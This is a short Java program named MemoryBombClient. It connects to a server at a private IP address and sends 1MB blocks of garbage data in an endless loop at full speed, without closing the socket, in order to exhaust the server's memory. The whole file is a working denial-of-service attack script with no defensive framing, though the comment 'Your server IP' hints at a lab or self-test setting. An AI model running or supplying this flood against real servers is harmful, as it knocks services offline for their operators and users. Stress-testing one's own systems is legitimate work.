import java.io.OutputStream;
import java.net.Socket;

public class MemoryBombClient {
    public static void main(String[] args) {
        String serverAddress = "10.0.101.82"; // Your server IP
        int port = 12345;
        
        System.out.println("Launching Memory Bomb...");

        try {
            Socket socket = new Socket(serverAddress, port);
            OutputStream out = socket.getOutputStream();

            // 1. Create a 1MB chunk of garbage data (all 'A's)
            byte[] garbage = new byte[1024 * 1024]; 
            for(int i=0; i<garbage.length; i++) garbage[i] = (byte)'A';

            // 2. Loop FOREVER. Do not close the socket.
            while (true) {
                out.write(garbage);
                out.flush();
                System.out.println("Sent 1MB...");
                // No Thread.sleep() - go as fast as network allows
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}